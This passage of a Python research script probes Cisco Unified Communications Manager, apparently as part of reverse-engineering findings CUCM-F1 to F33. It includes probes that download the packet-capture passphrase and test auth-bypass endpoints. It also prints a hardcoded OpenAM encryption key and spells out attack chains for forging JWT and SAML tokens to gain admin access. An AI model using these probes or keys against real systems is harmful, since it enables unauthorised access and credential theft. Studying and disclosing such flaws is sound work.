    Requires SSRF or local access — sends request simulating loopback origin.
    Note: X-Forwarded-For is NOT sufficient; the filter reads remoteAddr (real TCP source).
    This probe is meaningful only when run FROM the CUCM host.
    """
    endpoints = [
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/server",
        f"https://{host}:{port}/platformcom/api/v1/certmgr/config/snapshot/options",
    ]
    results = []
    for url in endpoints:
        try:
            r = requests.get(url, verify=False, timeout=10)
            results.append({"url": url, "status": r.status_code,
                            "len": len(r.content)})
        except Exception as e:
            results.append({"url": url, "error": str(e)})
    return {"finding": "CUCM-F2", "endpoints": results,
            "note": "200 without auth = unprotected endpoint confirmed"}


def probe_axl_auth(host: str, username: str, password: str,
                   port: int = 8443) -> dict:
    """Probe AXL SOAP API authentication."""
    url = f"https://{host}:{port}/axl/services/AXLAPIService"
    soap_body = '''<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:axl="http://www.cisco.com/AXL/API/15.0">
  <soapenv:Header/>
  <soapenv:Body>
    <axl:getCCMVersion/>
  </soapenv:Body>
</soapenv:Envelope>'''
    try:
        r = requests.post(url, data=soap_body,
                          headers={"Content-Type": "text/xml; charset=utf-8",
                                   "SOAPAction": '""'},
                          auth=(username, password),
                          verify=False, timeout=15)
        return {
            "status":   r.status_code,
            "auth_ok":  r.status_code == 200,
            "response_snippet": r.text[:200],
        }
    except Exception as e:
        return {"error": str(e)}


def probe_pktcap_passphrase(host: str, username: str, password: str, port: int = 8443) -> dict:
    """
    CUCM-F12: pktCap file parameter passphrase disclosure.
    Attempts to download /var/pktCap/.pktCap.passphrase via ?file=.pktCap.passphrase.
    Requires credentials for a user in the 'Standard Packet Sniffer Users' group.
    """
    import base64
    url = f"https://{host}:{port}/pktCap"
    params = {"file": ".pktCap.passphrase"}
    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        r = requests.get(url, params=params,
                         headers={"Authorization": f"Basic {cred}"},
                         verify=False, timeout=15)
        if r.status_code == 200 and len(r.content) > 0:
            return {
                "finding":       "CUCM-F12",
                "status":        r.status_code,
                "passphrase_len": len(r.content),
                "passphrase_hex": r.content.hex(),
                "passphrase_raw": r.content.decode('utf-8', errors='replace').strip(),
                "note":          "CONFIRMED: .pktCap.passphrase downloaded — use to decrypt *.pkt captures",
            }
        return {
            "finding": "CUCM-F12",
            "status":  r.status_code,
            "note":    ("403/401 = auth rejected or role missing"
                        if r.status_code in (401, 403) else
                        "404 = no captures running or file absent"),
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F12"}


def probe_pktcap_fileinfo(host: str, username: str, password: str, port: int = 8443) -> dict:
    """
    Probe pktCap for .fileinfo metadata (companion to F12 passphrase probe).
    .fileinfo contains capture session metadata without requiring a running capture.
    """
    import base64
    url = f"https://{host}:{port}/pktCap"
    params = {"file": ".fileinfo"}
    cred = base64.b64encode(f"{username}:{password}".encode()).decode()
    try:
        r = requests.get(url, params=params,
                         headers={"Authorization": f"Basic {cred}"},
                         verify=False, timeout=15)
        return {
            "finding": "CUCM-F12",
            "file":    ".fileinfo",
            "status":  r.status_code,
            "len":     len(r.content),
            "content": r.content.hex() if r.status_code == 200 else "",
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F12"}


def check_device_id_strstr_bypass(cert_cn: str, device_id: str) -> dict:
    """
    CUCM-F16: Simulate CheckDeviceIDinX509Certificate behavior.
    Tests whether certCN passes the strstr(certCN, deviceID[:16]) check used in ccm binary.
    Returns exploit assessment without requiring a live CUCM instance.
    """
    truncated_id = device_id[:16]
    passes_strstr = truncated_id in cert_cn
    passes_strcmp = cert_cn == device_id

    return {
        "finding":       "CUCM-F16",
        "cert_cn":       cert_cn,
        "device_id":     device_id,
        "truncated_id":  truncated_id,
        "passes_strstr": passes_strstr,
        "passes_strcmp": passes_strcmp,
        "vulnerable":    passes_strstr and not passes_strcmp,
        "note":          (
            "BYPASS: cert CN contains device ID as substring — strstr passes, strcmp fails"
            if (passes_strstr and not passes_strcmp) else
            "exact match — expected behavior" if passes_strcmp else
            "no match — registration would be rejected"
        ),
    }


def check_platform_api_trust_all_tls(host: str, port: int = 8443) -> dict:
    """
    CUCM-F17: Detect trust-all TrustManager exposure in platform-api SOAP client.
    Probes CertificateCsrAndDataExportService endpoint and checks whether CUCM accepts
    a self-signed cert without validation error — confirming the trust-all TrustManager is active.
    A 200 or SOAP fault (not TLS error) confirms the trust-all pattern.
    """
    import ssl, socket
    target_paths = [
        "/CertificateCsrAndDataExportService",
        "/APIVersionService",
    ]
    results = []
    for path in target_paths:
        url = f"https://{host}:{port}{path}"
        try:
            # Try with a self-signed cert context (what MITM would present)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            r = requests.post(
                url,
                data='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>',
                headers={"Content-Type": "text/xml"},
                verify=False, timeout=10,
            )
            results.append({
                "path":   path,
                "status": r.status_code,
                "note":   "SOAP endpoint reachable — trust-all TrustManager active if CUCM→peer connections use SSLProtocolSocketFactory",
            })
        except Exception as e:
            results.append({"path": path, "error": str(e)})
    return {
        "finding":  "CUCM-F17",
        "host":     host,
        "class":    "com.cisco.vos.platform.api.soapclient.SSLProtocolSocketFactory$1",
        "pattern":  "trust-all X509TrustManager: checkClientTrusted()=return; checkServerTrusted()=return; getAcceptedIssuers()=null",
        "affected": ["CertificateCsrAndDataExportServiceClient", "APIVersionServiceClient"],
        "probes":   results,
        "note":     "Trust-all confirmed statically from bytecode — all outbound HTTPS SOAP from platform-api layer is unvalidated",
    }


def probe_ciscora_est(host: str, port: int = 8084) -> dict:
    """
    CUCM-F23/F24: Probe CiscoRA EST server for Proof of Possession and NTLM auth exposure.
    CiscoRA runs on port 8084 (nginx + custom EST module).
    F23: est_pop off — enrollments accepted without key ownership proof.
    F24: est_certsrv_auth_method NTLM — Windows CA auth susceptible to NTLM relay.
    """
    results = {}
    base = f"https://{host}:{port}"
    # EST standard endpoints (RFC 7030)
    est_paths = [
        "/.well-known/est/cacerts",       # GET — returns CA cert chain (no auth)
        "/.well-known/est/simpleenroll",  # POST — CSR submission endpoint
        "/.well-known/est/csrattrs",      # GET — returns CSR attribute requirements
    ]
    for path in est_paths:
        url = base + path
        try:
            r = requests.get(url, verify=False, timeout=10)
            results[path] = {
                "status":        r.status_code,
                "content_type":  r.headers.get("Content-Type", ""),
                "len":           len(r.content),
                "auth_required": r.status_code in (401, 403),
                "note":          "EST endpoint reachable" if r.status_code != 404 else "not found",
            }
            if r.status_code == 401:
                www_auth = r.headers.get("WWW-Authenticate", "")
                results[path]["www_authenticate"] = www_auth
                results[path]["ntlm_confirmed"] = "NTLM" in www_auth
        except Exception as e:
            results[path] = {"error": str(e)}
    return {
        "finding":        "CUCM-F23+F24",
        "host":           host,
        "port":           port,
        "est_endpoints":  results,
        "config_evidence": {
            "est_pop":               "off",
            "est_certsrv_auth":      "NTLM",
            "hardcoded_ca_server":   "WIN-EJSG9DN4GS6",
        },
        "note": ("F23: est_pop off — submit CSR without private key proof; "
                 "F24: NTLM relay — intercept CiscoRA→WindowsCA NTLM handshake"),
    }


def probe_saml_sp_signing(host: str, port: int = 8443) -> dict:
    """
    CUCM-F27/F28: Fetch SAML SP metadata and check AuthnRequestsSigned and WantAssertionsSigned.
    SP metadata is at /ssosp/saml/SSO/alias/<entity>/metadata or /ssosp/saml/metadata/sp.xml.
    F27: AuthnRequestsSigned=false → AuthnRequests unsigned.
    F28: WantAssertionsSigned=false + metadata not signed.
    """
    import xml.etree.ElementTree as ET
    results = {}
    sp_paths = [
        "/ssosp/saml/metadata/sp.xml",
        "/ssosp/saml/SSO/alias/cucm/metadata",
    ]
    for path in sp_paths:
        url = f"https://{host}:{port}{path}"
        try:
            r = requests.get(url, verify=False, timeout=10)
            results[path] = {"status": r.status_code}
            if r.status_code == 200:
                try:
                    root = ET.fromstring(r.text)
                    ns = {'md': 'urn:oasis:names:tc:SAML:2.0:metadata'}
                    spsso = root.find('.//md:SPSSODescriptor', ns)
                    if spsso is not None:
                        results[path]["AuthnRequestsSigned"] = spsso.get('AuthnRequestsSigned', 'NOT_SET')
                        results[path]["WantAssertionsSigned"] = spsso.get('WantAssertionsSigned', 'NOT_SET')
                        sig = root.find('{http://www.w3.org/2000/09/xmldsig#}Signature')
                        results[path]["metadata_signed"] = sig is not None
                    results[path]["raw_snippet"] = r.text[:500]
                except ET.ParseError as e:
                    results[path]["parse_error"] = str(e)
        except Exception as e:
            results[path] = {"error": str(e)}
    return {
        "finding":    "CUCM-F27+F28",
        "host":       host,
        "port":       port,
        "config_defaults": {
            "metadata_auth_request_signed": "false",
            "metadata_assertion_signed":    "false",
            "sp_md_signed":                 "false",
        },
        "sp_metadata_probes": results,
        "note": ("F27: AuthnRequestsSigned=false → forged AuthnRequests; "
                 "F28: sp_md_signed=false → unsigned SP metadata allows substitution"),
    }


def check_rsa_pkcs1_in_asymencryption(jar_path: str = None) -> dict:
    """
    CUCM-F29: Confirm RSA/ECB/PKCS1PADDING usage in CCMAsymmetricEncryption.class.
    If jar_path provided, attempts to extract and verify the constant pool entry.
    Otherwise returns static bytecode evidence from RE.
    """
    evidence = {
        "class":         "com.cisco.ccm.security.CCMAsymmetricEncryption",
        "jar":           "cm-asymencryption-1.0.0.1-0.x86_64.rpm",
        "constant_pool": {"#9": "RSA/ECB/PKCS1PADDING"},
        "usage": [
            {"method": "rsaAsymPubEnc", "bytecode_offset": 12,  "path": "FIPS (isSecure=true, BCFIPSProvider)"},
            {"method": "rsaAsymPubEnc", "bytecode_offset": 77,  "path": "non-FIPS (SHA1PRNG)"},
        ],
        "anomaly":    "local var 'rsaOAEPEncrypter' (slot 3) stores RSA/ECB/PKCS1PADDING cipher — OAEP migration incomplete",
        "nist_ref":   "NIST SP 800-131A Rev2 (2023): PKCS#1 v1.5 key transport disallowed",
        "cve_class":  "Bleichenbacher adaptive chosen-ciphertext attack (1998)",
        "remediation": "Replace 'RSA/ECB/PKCS1PADDING' with 'RSA/ECB/OAEPWithSHA-256AndMGF1Padding'",
    }
    if jar_path:
        try:
            import subprocess
            result = subprocess.run(
                ["javap", "-verbose", "-classpath", jar_path,
                 "com.cisco.ccm.security.CCMAsymmetricEncryption"],
                capture_output=True, text=True, timeout=30,
            )
            evidence["javap_grep"] = [
                line for line in result.stdout.splitlines()
                if "PKCS1" in line or "OAEP" in line or "rsaOAEP" in line
            ]
        except Exception as e:
            evidence["javap_error"] = str(e)
    return {"finding": "CUCM-F29", "evidence": evidence}


def check_oauth_authzkeys_decryption(jar_path: str = None) -> dict:
    """CUCM-F32: Confirm OAuth signing/encryption keys in authzkeys table use CCMEncryption (F3 static key).

    Static evidence: GetAuthzKeys.decryptKey() bytecode:
      offset 0: new #80 // class com/cisco/ccm/security/CCMEncryption
      offset 7: astore_1
      offset 8: aload_1
      offset 9: aload_0
      offset 10: invokestatic #82 // CCMEncryption.hexToByte(String)[B
      offset 13: invokevirtual #83 // CCMEncryption.decryptPassword([B)String
    tkpurpose=1: symmetric AES key → decryptKey() → base64 decode → TokenKeys.symmetricKey
    tkpurpose=2: RSA signing private key → decryptKey() → readPrivateKey() → TokenKeys.verificationKey
    """
    evidence = {
        "class":  "com.cisco.security.ims.authentication.GetAuthzKeys",
        "method": "decryptKey(String)",
        "sql":    "select keyid, keyvalue, tkpurpose from authzkeys",
        "decrypt_calls": [
            {"offset": 85,  "opcode": "invokestatic",  "target": "decryptKey:(Ljava/lang/String;)Ljava/lang/String;", "context": "tkpurpose=1 symmetric key"},
            {"offset": 191, "opcode": "invokestatic",  "target": "decryptKey:(Ljava/lang/String;)Ljava/lang/String;", "context": "tkpurpose=2 RSA signing key"},
        ],
        "decrypt_impl": [
            "new #80 // com/cisco/ccm/security/CCMEncryption",
            "invokestatic #82 // CCMEncryption.hexToByte(String)[B",
            "invokevirtual #83 // CCMEncryption.decryptPassword([B)String",
        ],
        "key_paths": {
            "signing":    "/usr/local/platform/.security/authz/keys/authz_priv.pem",
            "encryption": "/usr/local/platform/.security/authz/keys/authz_symmetric_Key",
        },
        "chain": "F3 static key → CCMEncryption.decryptPassword(authzkeys.keyvalue) → RSA signing key → forge JWT → BearerAuthenticationRequestHandler accepts → admin access",
    }
    if jar_path:
        try:
            import subprocess
            result = subprocess.run(
                ["javap", "-p", "-c", "-classpath", jar_path,
                 "com.cisco.security.ims.authentication.GetAuthzKeys"],
                capture_output=True, text=True, timeout=30,
            )
            evidence["javap_grep"] = [
                line for line in result.stdout.splitlines()
                if "CCMEncryption" in line or "decryptKey" in line or "authzkeys" in line or "tkpurpose" in line
            ]
        except Exception as e:
            evidence["javap_error"] = str(e)
    return {"finding": "CUCM-F32", "severity": "CRITICAL", "evidence": evidence}


def check_openam_encryption_key(federation_config_path: str = None) -> dict:
    """CUCM-F33: Confirm hardcoded am.encryption.pwd in FederationConfig.properties.

    Static evidence:
      FederationConfig.properties L152: am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2
      FederationConfig.properties L113: passwordDecoder=com.sun.identity.fedlet.FedletEncodeDecode
      Affected: tomcat.keystore SAML signing key + Tomcat HTTPS TLS key
    """
    HARDCODED_KEY = "8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2"
    evidence = {
        "file":           "FederationConfig.properties",
        "path":           "/usr/local/platform/sso/saml/metadata/FederationConfig.properties",
        "hardcoded_key":  HARDCODED_KEY,
        "line":           152,
        "property":       "am.encryption.pwd",
        "decoder_class":  "com.sun.identity.fedlet.FedletEncodeDecode",
        "affected_secrets": [
            {"property": "com.sun.identity.saml.xmlsig.storepass",
             "value_path": "/usr/local/platform/.security/tomcat/keys/tomcat.passphrase",
             "unlocks": "tomcat.keystore JKS (SAML signing key + Tomcat TLS key)"},
            {"property": "com.sun.identity.saml.xmlsig.keypass",
             "value_path": "/usr/local/platform/.security/tomcat/keys/tomcat.passphrase",
             "unlocks": "SAML SP signing private key (alias: tomcat)"},
        ],
        "chain": (
            f"am.encryption.pwd={HARDCODED_KEY!r} → FedletEncodeDecode.decode(tomcat.passphrase) → "
            "JKS password → unlock tomcat.keystore → extract SAML signing key → "
            "forge SAML assertions for any user → admin access"
        ),
    }
    if federation_config_path:
        try:
            with open(federation_config_path) as f:
                for line in f:
                    if "am.encryption.pwd" in line:
                        value = line.split("=", 1)[1].strip()
                        evidence["observed_key"] = value
                        evidence["key_matches"] = (value == HARDCODED_KEY)
        except Exception as e:
            evidence["read_error"] = str(e)
    return {"finding": "CUCM-F33", "severity": "CRITICAL", "evidence": evidence}


def full_findings_summary() -> str:
    """Return a printable summary of all CUCM RE findings."""
    findings = [
        ("CUCM-F1",  "CRITICAL", "Axis2 admin:axis2 hardcoded + web.xml confirms no filter on /axis2-admin/* → RCE"),
        ("CUCM-F2",  "HIGH",     "platformcom BasicAuthentication localhost bypass"),
        ("CUCM-F3",  "CRITICAL", "Hardcoded AES-128 static key 'smetsysocsiccni' → decrypt ALL CUCM credentials"),
        ("CUCM-F4",  "HIGH",     "ccmuser:ccmuser hardcoded Informix DB credential"),
        ("CUCM-F5",  "CRITICAL", "Default passwordreverse = AES-CBC(statickey,'') → SIP auth bypass (all default users)"),
        ("CUCM-F6",  "MEDIUM",   "Nimbus JOSE+JWT 4.23 (2016) — alg:none bypass risk"),
        ("CUCM-F7",  "CRITICAL", "OpenSAML 2.6.5 XSW + SAMLAuthValve always-true bypass → admin access"),
        ("CUCM-F8",  "LOW",      "log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571"),
        ("CUCM-F9",  "INFO",     "dbaxlweb DB username exposed; pw encrypted with static key"),
        ("CUCM-F10", "CRITICAL", "SAMLAuthValve returns TRUE regardless of Realm.authenticate() result"),
        ("CUCM-F11", "HIGH",     "SAFClientControl inter-cluster pw decryptable via static key fallback"),
        ("CUCM-F12", "HIGH",     "pktCap file param — .pktCap.passphrase download → decrypt all packet captures"),
        ("CUCM-F13", "MEDIUM",   "pktCap second-order SQLi via remoteUser in group membership check"),
        ("CUCM-F14", "LOW",      "pktCap key arg injection into pktCap_protectData (mode flip, no shell inj)"),
        ("CUCM-F15", "LOW",      "pktCap BASIC auth over cleartext HTTP (transport-guarantee=NONE)"),
        ("CUCM-F16", "HIGH",     "Phone cert CN validated via strstr (not strcmp) — registration spoofing via substring cert"),
        ("CUCM-F17", "HIGH",     "Platform API SOAP client trust-all X509TrustManager — inter-cluster cert/key MITM"),
        ("CUCM-F18", "MEDIUM",   "AXL SQL Toolkit trust-all TrustManager + JVM-global HostnameVerifier bypass → credential interception"),
        ("CUCM-F19", "HIGH",     "platform-services.war Axis2 admin:axis2 + hotdeployment=true; axis2-web/ exposed without auth"),
        ("CUCM-F20", "LOW",      "dbl2j.jar TimedPingPrimary.main() development JDBC credential shipped in production bytecode"),
        ("CUCM-F21", "HIGH",     "LDAP Manager bind password decryptable via F3 static AES key → AD/LDAP full enumeration"),
        ("CUCM-F22", "MEDIUM",   "IMS LDAP/LDAPS TLS hostname verification disabled (disableEndpointIdentification=true) → AD MITM"),
        ("CUCM-F23", "MEDIUM",   "CiscoRA EST Proof of Possession disabled (est_pop off) — phone cert issued without key ownership proof"),
        ("CUCM-F24", "MEDIUM",   "CiscoRA EST NTLM relay to Windows CA — phone cert issuance via NTLM credential relay"),
        ("CUCM-F25", "LOW",      "Hardcoded dev hostname WIN-EJSG9DN4GS6 in production CiscoRA nginx.conf; lab CA cert ships with ISO"),
        ("CUCM-F26", "INFO",     "Developer GDB extension spy.py (IMDB=CCMDB, author 'Stephen') ships in production ISO"),
        ("CUCM-F27", "MEDIUM",   "SAML SP AuthnRequests unsigned by default (metadata_auth_request_signed=false) — forged IdP redirects"),
        ("CUCM-F28", "LOW",      "SAML SP metadata/assertion signing disabled (sp_md_signed=false) — SP metadata substitution surface"),
        ("CUCM-F29", "MEDIUM",   "CCMAsymmetricEncryption uses RSA/ECB/PKCS1PADDING (PKCS#1 v1.5, deprecated NIST SP 800-131A) — Bleichenbacher susceptibility"),
        ("CUCM-F30", "MEDIUM",   "CallManager RSA private key passphrase stored in plaintext at /usr/local/cm/.security/CallManager/keys/CallManager.passphrase"),
        ("CUCM-F31", "CRITICAL", "F3 static key decrypts Windows CA service account creds + FIPS SSM PIN from CACredentials.txt → ADCS compromise + lateral movement"),
        ("CUCM-F32", "CRITICAL", "F3 static key decrypts OAuth JWT signing + encryption keys in authzkeys DB table → forge tokens for any CUCM user"),
        ("CUCM-F33", "CRITICAL", "Hardcoded OpenAM am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2 in FederationConfig.properties → decode SAML JKS passphrase → forge SAML for any user"),
    ]
    lines = [f"CUCM 15.0.1 RE Findings [{VERSION}] — 2026-08-27", ""]
    for fid, sev, title in findings:
        lines.append(f"  [{sev:8s}] {fid}: {title}")
    lines.append("")
    lines.append(f"Static AES-128 key: {CCM_STATIC_ENCRYPTION_KEY.hex()} ({CCM_STATIC_ENCRYPTION_KEY!r})")
    lines.append("Findings doc: ~/Desktop/CUCM-findings.md")
    return '\n'.join(lines)


if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print(full_findings_summary())
    else:
        host = sys.argv[1]
        print(f"\n[CUCM-F1] Axis2 admin probe → {host}")
        print(probe_axis2_admin(host))
        print(f"\n[CUCM-F2] platformcom snapshot probe → {host}")
        print(probe_platformcom_localhost_bypass(host))
